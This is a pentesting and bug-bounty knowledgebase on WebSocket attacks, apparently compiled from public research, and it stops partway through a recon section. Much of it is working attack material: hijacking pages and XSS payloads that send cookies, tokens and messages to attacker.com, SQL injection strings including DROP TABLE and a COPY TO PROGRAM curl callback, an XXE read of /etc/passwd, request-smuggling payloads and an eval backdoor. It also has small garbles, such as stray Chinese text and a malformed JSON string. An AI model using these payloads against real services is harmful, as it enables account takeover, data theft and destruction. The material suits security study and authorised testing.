# WebSocket Security - Advanced Bug Bounty & Pentesting Knowledgebase

> **Research-grade reference for black-box WebSocket security testing, advanced exploitation chains, and bug bounty hunting.**
> 
> Compiled from PortSwigger Research, Web Security Academy, MDN Web APIs, HackTricks, PayloadsAllTheThings, ProjectDiscovery tooling, and real-world bug bounty findings.

---

## Table of Contents

- [Basics](#basics)
- [WebSocket Theory](#websocket-theory)
- [WebSocket Handshake Internals](#websocket-handshake-internals)
- [Protocol Upgrade Abuse](#protocol-upgrade-abuse)
- [Cross-Site WebSocket Hijacking](#cross-site-websocket-hijacking)
- [Origin Validation Bypasses](#origin-validation-bypasses)
- [Authentication Weaknesses](#authentication-weaknesses)
- [Message Tampering Payloads](#message-tampering-payloads)
- [WebSocket XSS Chains](#websocket-xss-chains)
- [WebSocket SQL Injection](#websocket-sql-injection)
- [WebSocket CSRF Chains](#websocket-csrf-chains)
- [WebSocket + Request Smuggling Chains](#websocket--request-smuggling-chains)
- [WebSocket + Cache Poisoning Chains](#websocket--cache-poisoning-chains)
- [WebSocket + OAuth Chains](#websocket--oauth-chains)
- [Parser Confusion Payloads](#parser-confusion-payloads)
- [Browser Quirks](#browser-quirks)
- [Gadget Chains](#gadget-chains)
- [Real World Case Studies](#real-world-case-studies)
- [Fuzzing Payloads](#fuzzing-payloads)
- [Automation Workflows](#automation-workflows)
- [Recon Methodology](#recon-methodology)
- [Nuclei Templates](#nuclei-templates)
- [Tools and Scanners](#tools-and-scanners)
- [Advanced Research](#advanced-research)
- [Bug Bounty Writeups](#bug-bounty-writeups)
- [Payload Collections](#payload-collections)
- [WAF Bypasses](#waf-bypasses)
- [Detection Techniques](#detection-techniques)
- [References](#references)

---

## Basics

### What are WebSockets?

WebSockets provide a **long-lived, bidirectional, full-duplex** communication channel over a single TCP connection. They are initiated over HTTP via an **Upgrade handshake** and then transition to the WebSocket protocol (ws:// or wss://).

**Key Characteristics:**
- Initiated via HTTP `Upgrade: websocket` request
- Uses `Connection: Upgrade` header
- Handshake completed with `101 Switching Protocols`
- After handshake, the connection operates in **binary or text frames**
- No同源策略 (SOP) enforcement on the WebSocket protocol itself — origin validation is server-side responsibility

### Why WebSockets Matter for Security

WebSockets are widely used in modern web applications for:
- Real-time chat and messaging
- Live notifications / push updates
- Financial tickers / trading platforms
- Collaborative editing
- Gaming and streaming
- IoT device control panels

**Security implication:** Virtually any web vulnerability that exists in HTTP can also exist in WebSocket communications — XSS, SQLi, XXE, IDOR, deserialization, command injection, etc. Additionally, WebSockets introduce **unique attack classes** such as Cross-Site WebSocket Hijacking (CSWSH), message tampering, and protocol upgrade abuse.

---

## WebSocket Theory

### Protocol Overview

```
Client                                    Server
  |                                         |
  |------ GET /chat HTTP/1.1 --------------->|
  |      Host: example.com                  |
  |      Upgrade: websocket                 |
  |      Connection: Upgrade                |
  |      Sec-WebSocket-Key: dGhlIHNhbXBsZQ==|
  |      Sec-WebSocket-Version: 13          |
  |                                         |
  |<----- HTTP/1.1 101 Switching Protocols--|
  |      Upgrade: websocket                 |
  |      Connection: Upgrade                |
  |      Sec-WebSocket-Accept: s3pPLMBiTxaQ |
  |                                         |
  |<======= WebSocket Frames ==============>|
  |      (text, binary, ping, pong, close)  |
```

### WebSocket Frame Structure (RFC 6455)

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-------+-+-------------+-------------------------------+
|F|R|R|R| opcode|M| Payload len |    Extended payload length    |
|I|S|S|S|  (4)  |A|     (7)     |             (16/64)           |
|N|V|V|V|       |S|             |   (if payload len==126/127)   |
| |1|2|3|       |K|             |                               |
+-+-+-+-+-------+-+-------------+ - - - - - - - - - - - - - - +
|     Extended payload length continued, if payload len == 127  |
+ - - - - - - - - - - - - - - +-------------------------------+
|                               | Masking-key, if MASK set to 1 |
+-------------------------------+-------------------------------+
| Masking-key (continued)       |          Payload Data         |
+-------------------------------- - - - - - - - - - - - - - - -+
:                     Payload Data continued ...                :
+ - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - +
|                     Payload Data continued ...                |
+---------------------------------------------------------------+
```

**Opcodes:**
- `0x1` = Text frame
- `0x2` = Binary frame
- `0x8` = Connection close
- `0x9` = Ping
- `0xA` = Pong

**Masking:** Client-to-server frames MUST be masked (XORed with a 32-bit masking key). Server-to-client frames MUST NOT be masked. This is designed to prevent cache poisoning attacks via malicious WebSocket frames sent through proxy servers.

---

## WebSocket Handshake Internals

### The Upgrade Request

```http
GET /chat HTTP/1.1
Host: example.com
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Key: dGhlIHNhbXBsZQ==
Sec-WebSocket-Version: 13
Origin: https://example.com
Cookie: session=abc123
```

### The Upgrade Response

```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQbkd0sWbN4P7l+1g=
```

**Sec-WebSocket-Accept Calculation:**
```
Accept = Base64(SHA1(Sec-WebSocket-Key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"))
```

### Critical Handshake Security Notes

1. **Session Context Binding:** The session context for all subsequent WebSocket messages is determined by the session context of the handshake request. If the handshake is authenticated via Cookie, all messages on that connection inherit those privileges.

2. **No Automatic CSRF Protection:** Unlike state-changing HTTP POST requests, the WebSocket handshake is a GET request. Standard CSRF tokens in forms do NOT protect the handshake unless explicitly implemented.

3. **Origin Header is Advisory:** The `Origin` header in the handshake is set by the browser and cannot be modified by JavaScript. However, the server is NOT required to validate it. Many applications ignore it entirely.

4. **Custom Headers:** Applications may implement custom headers (e.g., `X-CSRF-Token`) in the handshake. These can be attacked if not properly protected.

5. **X-Forwarded-For Trust Issues:** Some applications use `X-Forwarded-For` or similar headers during the handshake for IP-based security decisions. These are attacker-controllable and can lead to security bypasses.

---

## Protocol Upgrade Abuse

### Upgrade Header Injection

Some proxies and servers mishandle the `Upgrade` header, allowing attackers to force protocol upgrades on endpoints not intended for WebSockets.

```http
GET /admin HTTP/1.1
Host: target.com
Connection: Upgrade, Keep-Alive
Upgrade: websocket
Sec-WebSocket-Key: dGhlIHNhbXBsZQ==
Sec-WebSocket-Version: 13
```

**Attack Scenarios:**
- Force a WebSocket upgrade on a REST endpoint that expects HTTP, causing parser confusion
- Bypass WAFs that inspect HTTP but not WebSocket frames
- Desynchronize front-end/back-end protocol handling

### Connection Header Manipulation

```http
GET /api/sensitive HTTP/1.1
Host: target.com
Connection: keep-alive, Upgrade
Upgrade: websocket
```

**Research Note:** Some reverse proxies (e.g., certain Nginx/Cloudflare configurations) may strip or mishandle the `Connection` header, causing the backend to see a standard HTTP request while the frontend maintains a WebSocket connection. This can lead to **request smuggling via protocol confusion**.

### HTTP/2 to WebSocket Upgrade (RFC 8441)

HTTP/2 supports WebSocket upgrade via the `:protocol` pseudo-header:

```http
:method = CONNECT
:protocol = websocket
:scheme = https
:path = /chat
:authority = target.com
sec-websocket-version: 13
sec-websocket-key: dGhlIHNhbXBsZQ==
```

**Abuse Cases:**
- Bypass front-end restrictions that block HTTP/1.1 WebSocket upgrades
- Exploit HTTP/2-specific parsing differences during the CONNECT handshake
- Chain with HTTP/2 desync attacks (see Browser-Powered Desync research)

---

## Cross-Site WebSocket Hijacking

### Definition

Cross-Site WebSocket Hijacking (CSWSH) is a **CSRF vulnerability on the WebSocket handshake**. An attacker-controlled website can make the victim's browser open a WebSocket connection to a target site, leveraging the victim's cookies/session. Because the handshake is a GET request, it is not protected by standard CSRF defenses unless explicitly mitigated.

### Attack Flow

```
1. Victim is authenticated to target.com (has valid session cookie)
2. Victim visits attacker.com
3. attacker.com executes:

   var ws = new WebSocket("wss://target.com/chat");
   ws.onopen = function() {
       ws.send("{"action":"transfer","to":"attacker","amount":1000}");
   };
   ws.onmessage = function(event) {
       fetch("https://attacker.com/log?data=" + btoa(event.data));
   };

4. Browser sends handshake to target.com WITH cookies
5. WebSocket connection established with victim's privileges
6. Attacker can now send messages as the victim AND receive responses
```

### Impact

- **Data Exfiltration:** Read sensitive messages, notifications, chat history, or real-time data feeds
- **Privilege Abuse:** Perform privileged actions (transfers, configuration changes, messages) as the victim
- **Session Hijacking:** If the WebSocket exposes session tokens or authentication data in messages
- **Lateral Movement:** Use the hijacked WebSocket to pivot to other internal services

### CSWSH Proof-of-Concept Payload

```html
<!-- CSWSH Exploit Page -->
<script>
var ws = new WebSocket('wss://vulnerable.com/ws');
ws.onopen = function() {
    // Send a malicious message once connected
    ws.send(JSON.stringify({
        "type": "message",
        "content": "<img src=x onerror=alert(document.domain)>"
    }));
};
ws.onmessage = function(event) {
    // Exfiltrate responses to attacker server
    fetch('https://attacker.com/log?d=' + encodeURIComponent(btoa(event.data)));
};
</script>
```

### Advanced CSWSH with Binary Data

```javascript
// Exfiltrate binary data (e.g., images, files transferred over WS)
var ws = new WebSocket('wss://target.com/ws');
ws.binaryType = 'arraybuffer';
ws.onmessage = function(event) {
    if (event.data instanceof ArrayBuffer) {
        var blob = new Blob([event.data]);
        var formData = new FormData();
        formData.append('file', blob, 'stolen.bin');
        fetch('https://attacker.com/exfil', {method: 'POST', body: formData});
    }
};
```

---

## Origin Validation Bypasses

### Missing Origin Check

The most common vulnerability: the server simply does not validate the `Origin` header during the handshake.

```javascript
// Vulnerable server-side code (Node.js/ws library)
const wss = new WebSocket.Server({ server });
// No origin verification implemented
```

### Weak Origin Validation

**Exact string match bypass:**
```javascript
// Vulnerable: only checks if Origin CONTAINS the domain
if (origin.includes('target.com')) { ... }

// Bypass:
Origin: https://attacker-target.com
Origin: https://target.com.attacker.com
```

**Regex bypass:**
```javascript
// Vulnerable regex
/^https:\/\/.*target\.com$/

// Bypass:
Origin: https://www.target.com.attacker.com
Origin: https://subdomain-target.com
```

**Null origin bypass:**
```javascript
// Some applications whitelist "null" origin for local development
if (origin === 'https://target.com' || origin === 'null') { ... }

// Trigger null origin via:
// - sandboxed iframe
// - file:// origin
// - redirect from data: URI
```

### Null Origin Attack

```html
<!-- Force null origin using sandboxed iframe -->
<iframe sandbox="allow-scripts" srcdoc="
<script>
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() { ws.send('exploit'); };
</script>
"></iframe>
```

### Origin Spoofing via Redirects

Some applications validate the `Origin` header but then use the `Referer` or another header for security decisions. If the application follows redirects during handshake validation:

```http
GET /ws HTTP/1.1
Host: target.com
Origin: https://trusted-partner.com
```

Where `trusted-partner.com` is an open redirect that the attacker controls.

### Subdomain Takeover → Origin Bypass

If `Origin: https://legacy.target.com` is whitelisted and `legacy.target.com` is an abandoned subdomain vulnerable to takeover:

```javascript
// Attacker takes over legacy.target.com
// Now CSWSH works from legacy.target.com
var ws = new WebSocket('wss://target.com/ws');
```

---

## Authentication Weaknesses

### Cookie-Based Authentication

WebSocket handshakes automatically include cookies (including `HttpOnly` cookies) for the target domain. This is by design but creates CSWSH risk.

```http
GET /ws HTTP/1.1
Host: target.com
Cookie: session=SECRET_TOKEN; auth=BEARER_TOKEN
Origin: https://attacker.com   <-- If not validated, attacker gets full session
```

### Token in URL Parameter

Some applications pass authentication tokens in the WebSocket URL:

```
wss://target.com/ws?token=SECRET_JWT
```

**Risks:**
- Token logged in proxy/access logs
- Token leaked via Referer if the WebSocket page links to external sites
- Token exposed to JavaScript (if not HttpOnly cookie)

### Token in Initial Message

```javascript
// Client sends auth token AFTER connection
ws.onopen = function() {
    ws.send(JSON.stringify({"auth": "Bearer SECRET"}));
};
```

**Attack:** If CSWSH succeeds, attacker can send their own auth token OR wait for the server to request auth and intercept the victim's response.

### No Authentication on Handshake

Some applications authenticate the WebSocket connection only after the handshake, using messages. If the handshake itself is unauthenticated but the server assumes it is, this can lead to **unauthorized WebSocket connections** that bypass authentication layers entirely.

### JWT in Sec-WebSocket-Protocol

RFC 6455 allows subprotocols to be specified:

```http
Sec-WebSocket-Protocol: auth, bearer-token-SECRET_JWT_HERE
```

Some implementations embed JWTs in this header. If the server reflects or logs this header, it can leak tokens.

---

## Message Tampering Payloads

### Intercepting and Modifying Messages

Using Burp Suite or similar proxy:
1. Intercept WebSocket messages in the Proxy > WebSockets history tab
2. Send to Repeater for replay/modification
3. Edit and resend individual frames

### JSON Message Tampering

```json
// Original
{"message":"Hello Carlos"}

// XSS via message tampering
{"message":"<img src=1 onerror='alert(1)'>"}

// SQL Injection via message tampering
{"message":"' UNION SELECT username,password FROM users--"}

// Command injection
{"message":"; cat /etc/passwd;"}

// Path traversal
{"message":"../../../etc/passwd"}

// Template injection
{"message":"{{7*7}}"}
```

### XML Message Tampering

```xml
<!-- Original -->
<message>Hello</message>

<!-- XXE -->
<message><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>&xxe;</message>

<!-- XSS -->
<message><![CDATA[<script>alert(1)</script>]]></message>
```

### Binary Message Tampering

```python
# Python example: tamper with binary WebSocket frames
import websocket
ws = websocket.create_connection("wss://target.com/ws")
# Send malformed binary frame
ws.send_binary(b'\x00\x01\x02' + b'A' * 10000)
```

### Message Format Confusion

Send a message in an unexpected format to trigger parser confusion:

```json
// Server expects JSON, send XML wrapper
{"message": "<xml><foo>bar</foo></xml>"}

// Server expects text, send JSON
{"type": "chat", "msg": "hello"}

// Nested JSON injection
{"message": "{\"nested\": \"value\"}"}
```

---

## WebSocket XSS Chains

### Stored XSS via WebSocket Messages

When user input from WebSocket messages is rendered in other users' browsers without sanitization:

```json
// Attacker sends via WebSocket:
{"message": "<img src=x onerror=fetch('https://attacker.com/?c='+document.cookie)>"}
```

### Reflected XSS via WebSocket Handshake

If the server reflects handshake parameters (e.g., path, query string, custom headers) in the response:

```http
GET /ws?callback=<script>alert(1)</script> HTTP/1.1
Host: target.com
Upgrade: websocket
```

### DOM-Based XSS via WebSocket Data

```javascript
// Vulnerable client-side code
ws.onmessage = function(event) {
    var data = JSON.parse(event.data);
    document.getElementById('chat').innerHTML = data.message;  // SINK
};
```

**Exploit:**
```json
{"message": "<img src=x onerror=alert(1)>"}
```

### WebSocket + postMessage XSS Chain

```javascript
// Vulnerable app forwards WebSocket messages to postMessage
ws.onmessage = function(event) {
    window.parent.postMessage(event.data, '*');
};
```

**Exploit from attacker iframe:**
```javascript
window.addEventListener('message', function(e) {
    if (e.data.includes('session')) {
        fetch('https://attacker.com/?stolen=' + encodeURIComponent(e.data));
    }
});
```

### Client-Side Prototype Pollution via WebSocket

```json
// If WebSocket data is merged into objects without sanitization
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}
```

---

## WebSocket SQL Injection

### Inline SQL in WebSocket Messages

```json
// Original message
{"action": "search", "query": "laptops"}

// SQL Injection
{"action": "search", "query": "laptops' UNION SELECT username,password FROM users--"}
{"action": "search", "query": "laptops' OR '1'='1"}
{"action": "search", "query": "laptops'; DROP TABLE users;--"}
```

### Blind SQLi over WebSocket

```javascript
// Time-based blind SQLi payload
{"query": "laptops' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"}

// Boolean-based blind SQLi
{"query": "laptops' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--"}
```

### Out-of-Band SQLi via WebSocket + DNS

```json
{"query": "laptops' AND LOAD_FILE(CONCAT('\\',(SELECT password FROM users LIMIT 1),'.attacker.com\a.txt'))--"}
```

### SQLite-specific WebSocket SQLi

```json
{"query": "laptops' UNION SELECT sql FROM sqlite_master--"}
{"query": "laptops' UNION SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table'--"}
```

### PostgreSQL WebSocket SQLi

```json
{"query": "laptops'; COPY (SELECT '') TO PROGRAM 'curl attacker.com/?x=$(id)'--"}
{"query": "laptops'; SELECT pg_sleep(5)--"}
```

---

## WebSocket CSRF Chains

### CSRF via WebSocket Message (No CSRF Token)

```json
{"action": "change_email", "email": "attacker@evil.com"}
{"action": "transfer", "to": "attacker", "amount": 10000}
{"action": "delete_account", "confirm": true}
```

### CSRF with Predictable Message Format

If the application uses a predictable JSON-RPC or GraphQL-over-WS format:

```json
// JSON-RPC over WebSocket
{"jsonrpc": "2.0", "method": "deleteUser", "params": [123], "id": 1}

// GraphQL over WebSocket
{"type": "start", "id": "1", "payload": {"query": "mutation { deleteAccount }"}}
```

### Cross-Site WebSocket Hijacking as CSRF

CSWSH is essentially **CSRF for WebSocket messages**. Any state-changing message sent over a hijacked WebSocket is a CSRF attack.

### Bypassing SameSite Cookies via WebSocket

WebSocket handshakes are **not subject to SameSite cookie restrictions** in the same way as regular cross-site requests. The browser treats the WebSocket upgrade as a navigation-like request, sending cookies regardless of SameSite settings (depending on browser version and implementation).

**Note:** Modern browsers are tightening this. Chrome sends cookies on WebSocket handshakes based on SameSite rules since ~2020. However, many legacy applications and browsers remain vulnerable.

---

## WebSocket + Request Smuggling Chains

### WebSocket Upgrade Smuggling (HTTP/1.1)

If a front-end proxy forwards the `Upgrade: websocket` header but mishandles the body or connection state:

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 44
Transfer-Encoding: chunked

0

GET /ws HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZQ==
```

**Result:** The front-end parses by Content-Length, the back-end parses by Transfer-Encoding. The second request (WebSocket upgrade) is smuggled to the backend, potentially establishing a WebSocket connection that bypasses front-end controls.

### H2.TE / H2.CL Desync → WebSocket

From PortSwigger's Browser-Powered Desync research:

```http
:method = POST
:path = /
:authority = target.com
content-length: 0

GET /ws HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
```

HTTP/2 front-end downgrades to HTTP/1.1. If the front-end uses HTTP/2's built-in length and the back-end respects the injected `Content-Length: 0`, the body (`GET /ws...`) is treated as a new request, smuggling a WebSocket upgrade.

### Client-Side Desync (CSD) → WebSocket Hijacking

Using browser-powered desync to poison the connection pool, then navigate to a WebSocket endpoint:

```javascript
fetch('https://target.com/redirect', {
    method: 'POST',
    body: 'GET /ws HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZQ==

',
    credentials: 'include',
    mode: 'no-cors'
}).then(() => {
    // Navigate to target.com, browser may use poisoned connection for WS upgrade
    location = 'https://target.com/app';
});
```

### WebSocket Frame Injection via Desync

If a desync attack allows injecting arbitrary bytes into a connection that is later upgraded to WebSocket, the injected bytes may be interpreted as WebSocket frames, causing **frame injection**.

---

## WebSocket + Cache Poisoning Chains

### WebSocket Handshake Cache Poisoning

Some CDNs and caches may cache the `101 Switching Protocols` response or intermediate responses:

```http
GET /ws HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
Upgrade: websocket
Connection: Upgrade
```

If the application uses `X-Forwarded-Host` to generate URLs in the handshake response (e.g., subprotocol URLs, redirect URLs), this can be poisoned.

### Cache Key Poisoning via Unkeyed Headers

Using Param Miner methodology on WebSocket handshake:

```http
GET /ws HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
X-Forwarded-Scheme: http
Upgrade: websocket
```

If the cache keys only on `Host` + `Path` but the application uses `X-Forwarded-Host` for WebSocket subprotocol negotiation, subsequent users may connect to attacker-controlled endpoints.

### WebSocket + DOM Poisoning

If WebSocket messages update the DOM and the page is cached:

```json
{"type": "config", "api_endpoint": "https://attacker.com/api"}
```

Poison the cache with a message that causes the client to load JS from attacker.com.

---

## WebSocket + OAuth Chains

### OAuth Token Exposure via WebSocket

If the application passes OAuth access tokens in WebSocket messages:

```json
{"auth": {"type": "oauth", "token": "ya29.a0ARrdaM..."}}
```

CSWSH allows the attacker to receive these tokens in messages.

### Hidden OAuth Attack Vectors (PortSwigger Research)

WebSocket endpoints may be used for OAuth token refresh:

```json
{"action": "refresh_token", "refresh_token": "SECRET"}
```

If the attacker can hijack the WebSocket, they can:
1. Intercept refresh tokens
2. Trigger token refresh to obtain new access tokens
3. Use the WebSocket to initiate OAuth flows with malicious redirect_uris

### OpenID Connect over WebSocket

Some implementations use WebSockets for OpenID Connect session management:

```json
{"type": "session_state", "state": "..."}
```

CSWSH can be used to:
- Hijack session state notifications
- Force premature session termination
- Intercept logout tokens

---

## Parser Confusion Payloads

### HTTP/1.1 vs WebSocket Parser Confusion

```http
GET /ws HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZQ==
Content-Length: 33

GET /admin HTTP/1.1
Host: target.com
```

Some servers may interpret the body as the start of WebSocket frames or as a second HTTP request.

### Double Content-Type Confusion

```http
GET /ws HTTP/1.1
Host: target.com
Content-Type: application/json
Content-Type: text/plain
Upgrade: websocket
```

If the front-end and back-end parse different Content-Type headers, the WebSocket message parser may be confused.

### Chunked Encoding + WebSocket

```http
POST /ws HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Upgrade: websocket
Connection: Upgrade

5
HELLO
0

```

If the server supports both chunked transfer and WebSocket upgrade on the same endpoint, the chunked body may be interpreted as WebSocket frames.

### Sec-WebSocket-Version Confusion

```http
GET /ws HTTP/1.1
Host: target.com
Upgrade: websocket
Sec-WebSocket-Version: 13
Sec-WebSocket-Version: 8
```

Some implementations may parse the first version, others the last, leading to protocol downgrade or rejection bypass.

---

## Browser Quirks

### Cookie Behavior in WebSocket Handshakes

| Browser | SameSite=Strict | SameSite=Lax | SameSite=None |
|---------|----------------|--------------|---------------|
| Chrome 80+ | Sent if same-site | Sent if same-site or top-level navigation | Always sent |
| Firefox | Similar to Chrome | Similar to Chrome | Always sent |
| Safari | Varies by version | Varies by version | Always sent |

**Key Quirk:** WebSocket handshakes are often treated as "navigation-like" requests, meaning `SameSite=Lax` cookies MAY be sent on cross-site WebSocket upgrades in some browser versions. This makes CSWSH more powerful than traditional CSRF in certain contexts.

### Connection Pool Behavior

Browsers maintain separate connection pools for:
- HTTP/1.1 vs HTTP/2
- With cookies vs without cookies
- With TLS vs without TLS

**Exploitation:** Client-side desync attacks must poison the correct pool. Use `credentials: 'include'` in fetch() to ensure you're poisoning the "with-cookies" pool that navigations use.

### WebSocket in Sandboxed Contexts

```html
<!-- Sandboxed iframe can still open WebSockets in some browsers -->
<iframe sandbox="allow-scripts" src="...">
```

The `sandbox` attribute does NOT block WebSocket connections unless `allow-same-origin` is absent AND the origin is already unique. A sandboxed iframe from a unique origin can still open WebSockets to any server.

### WebSocket + CSP

`connect-src` directive in CSP controls WebSocket destinations:

```
Content-Security-Policy: connect-src 'self' wss://trusted.com;
```

**Bypass:** If CSP is missing or uses `connect-src *`, WebSockets can connect anywhere. If `connect-src 'self'` is set, the WebSocket must be same-origin.

### WebSocket in Service Workers

Service Workers can intercept WebSocket handshakes (but NOT the WebSocket frames themselves):

```javascript
self.addEventListener('fetch', event => {
    if (event.request.headers.get('Upgrade') === 'websocket') {
        // Can observe the handshake, modify headers, but not frames
    }
});
```

---

## Gadget Chains

### Host-Header Redirect Gadget

If the WebSocket server issues redirects based on `Host` or `X-Forwarded-Host`:

```http
GET /ws HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
Upgrade: websocket
```

**Response:**
```http
HTTP/1.1 301 Moved Permanently
Location: https://attacker.com/ws
```

**Chain:** Combine with cache poisoning to redirect all WebSocket connections to attacker-controlled server.

### HEAD Method Splicing Gadget

From Browser-Powered Desync research — adapted for WebSocket:

```http
POST /ws HTTP/1.1
Host: target.com
Content-Length: 67

HEAD /404/?cb=123 HTTP/1.1
Host: target.com

GET /x?<script>evil()</script> HTTP/1.1
Host: target.com
```

If the server ignores CL on POST to `/ws`, the body is treated as new requests. The HEAD response (with HTML Content-Type) is spliced with the next response.

### JavaScript Resource Poisoning Gadget

If the WebSocket endpoint returns JavaScript that is imported elsewhere:

```javascript
// Attacker poisons WebSocket endpoint to return:
var ws = new WebSocket('wss://target.com/ws');
ws.onmessage = function(e) {
    eval(e.data);  // Backdoor
};
```

### Stacked Response Gadget

Browsers discard connections if they receive more response data than expected. To exploit this in CSD:

1. Use cache-busters to delay responses
2. Pad injected requests with lengthy headers
3. Use `mode: 'cors'` to prevent automatic redirect following

---

## Real World Case Studies

### Case Study 1: Slack WebSocket Hijacking (Historical)

Slack's real-time messaging API used WebSockets with cookie-based auth. Early versions did not properly validate Origin, allowing CSWSH attacks that could read messages and post as the victim.

**Mitigation:** Strict Origin validation + token-based auth in messages.

### Case Study 2: Trading Platform Data Exfiltration

A financial trading platform used WebSockets for live price feeds. The WebSocket handshake did not validate Origin. An attacker could host a malicious page that:
1. Opened a WebSocket to the trading platform
2. Received real-time price data (proprietary)
3. Exfiltrated it to attacker servers

**Impact:** Theft of real-time financial data, potential insider trading advantage.

### Case Study 3: Chat Application Stored XSS

A chat application used WebSockets to broadcast messages. Messages were rendered using `innerHTML` without sanitization:

```javascript
ws.onmessage = function(event) {
    var msg = JSON.parse(event.data);
    chatDiv.innerHTML += `<div>${msg.content}</div>`;
};
```

**Exploit:**
```json
{"content": "<img src=x onerror=fetch('https://attacker.com/?c='+localStorage.token)>"}
```

**Result:** Stored XSS affecting all chat participants, token theft via localStorage.

### Case Study 4: Browser-Powered Desync on Amazon (James Kettle, 2021)

Amazon.com ignored Content-Length on POST to `/b/`, allowing CL.0 desync. While not directly WebSocket, this demonstrates how protocol handling anomalies can be chained:

```http
POST /b/ HTTP/2
Host: www.amazon.com
Content-Length: 23

GET /404 HTTP/1.1
X: X
```

**WebSocket Relevance:** Similar desync vectors can be used to smuggle WebSocket upgrades, bypass front-end restrictions, or poison connections used for WebSocket handshakes.

### Case Study 5: Akamai Client-Side Desync (Capital One)

Akamai ignored Content-Length on redirects. Attackers used CSD to poison browser connection pools and hijack JavaScript imports. The same technique can be applied to WebSocket endpoints that share connections with HTTP traffic.

---

## Fuzzing Payloads

### WebSocket Message Fuzzing

```json
{"message": "FUZZ"}
{"message": "<FUZZ>"}
{"message": "'FUZZ"}
{"message": "${FUZZ}"}
{"message": "{{FUZZ}}"}
{"message": ";FUZZ"}
{"message": "|FUZZ"}
{"message": "$(FUZZ)"}
{"message": "`FUZZ`"}
```

### Handshake Header Fuzzing

```http
GET /ws HTTP/1.1
Host: FUZZ
Upgrade: FUZZ
Connection: FUZZ
Sec-WebSocket-Key: FUZZ
Sec-WebSocket-Version: FUZZ
Origin: FUZZ
X-Forwarded-For: FUZZ
X-Forwarded-Host: FUZZ
X-Forwarded-Proto: FUZZ
```

### Protocol Upgrade Fuzzing

```http
GET /ws HTTP/1.1
Upgrade: websocket, FUZZ
Connection: Upgrade, FUZZ
Sec-WebSocket-Protocol: FUZZ, auth
Sec-WebSocket-Extensions: FUZZ
```

### Frame Format Fuzzing

```python
# Malformed frames
import struct

# Frame with reserved bits set
frame = b'\x50\x00'  # RSV1=1, opcode=0 (continuation)

# Frame with invalid opcode
frame = b'\x8f\x00'  # opcode=15 (invalid)

# Oversized control frame
frame = b'\x89\x7e\x00\x10' + b'A'*16  # ping with 16 bytes payload

# Unmasked client frame (protocol violation)
frame = b'\x81\x05Hello'  # FIN=1, text, unmasked

# Fragmented message with invalid order
frame1 = b'\x01\x05Hello'  # FIN=0, text (first fragment)
frame2 = b'\x81\x05World'  # FIN=1, text (should be continuation 0x0)
```

---

## Automation Workflows

### WebSocket Recon with httpx + katana

```bash
# 1. Discover WebSocket endpoints
httpx -l targets.txt -path /ws,/socket,/websocket,/chat,/realtime -status-code -title -websocket

# 2. Crawl for WebSocket references in JS files
katana -u https://target.com -jc -jsl -ef js,map,json | grep -i websocket

# 3. Subdomain enumeration for WebSocket services
subfinder -d target.com | httpx -path /ws -status-code
```

### Nuclei WebSocket Scanning

```bash
# Run WebSocket-specific nuclei templates
nuclei -u https://target.com -t http/vulnerabilities/websocket/ -v

# Custom template for CSWSH detection
cat > cswsh-check.yaml << 'EOF'
id: websocket-cswsh-check
info:
  name: Cross-Site WebSocket Hijacking Check
  author: custom
  severity: high

http:
  - raw:
      - |
        GET /ws HTTP/1.1
        Host: {{Hostname}}
        Origin: https://attacker.com
        Upgrade: websocket
        Connection: Upgrade
        Sec-WebSocket-Key: dGhlIHNhbXBsZQ==
        Sec-WebSocket-Version: 13
    matchers:
      - type: status
        status:
          - 101
      - type: word
        words:
          - "Sec-WebSocket-Accept"
    extractors:
      - type: regex
        regex:
          - "Sec-WebSocket-Accept: (.+)"
EOF

nuclei -u https://target.com -t cswsh-check.yaml
```

### Automated Message Fuzzing with Turbo Intruder

```python
# turbo_intruder_websocket.py
from turbo_intruder import *

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=1,
                           pipeline=False)

    for payload in wordlists["payloads"]:
        ws_frame = construct_websocket_frame(payload)
        engine.queue(target.req, ws_frame)

def handleResponse(req, interesting):
    if interesting:
        table.add(req)

def construct_websocket_frame(payload):
    # Build a masked text frame
    key = b'\x00\x00\x00\x00'
    masked = xor(payload.encode(), key)
    return b'\x81' + encode_length(len(payload)) + key + masked
```

### WebSocket Brute-forcing with ffuf

```bash
# Brute-force WebSocket subprotocols
ffuf -u wss://target.com/ws      -H "Sec-WebSocket-Protocol: FUZZ"      -w protocols.txt      -mc 101

# Brute-force WebSocket paths
ffuf -u wss://target.com/FUZZ      -w ws-paths.txt      -mc 101
```

---

## Recon Methodology

### Phase 1: Discovery

1. **Crawl JavaScript for WebSocket URLs:**
   ```bash
   grep -r "new WebSocket\|ws://\|wss://" js_files/
   grep -r "SockJS\|Socket.io\|SignalR" js_files/
   ```

2. **Check Common Paths:**
   ```
   /ws, /websocket, /socket, /socket.io, /sockjs, /signalr,
   /chat, /realtime, /live, /stream, /events, /pubsub,
   /graphql, /subscriptions, /ws-api, /api/ws
   ```

3. **Analyze WebSocket References in API Documentation:**
   - OpenAPI specs may document WebSocket endpoints
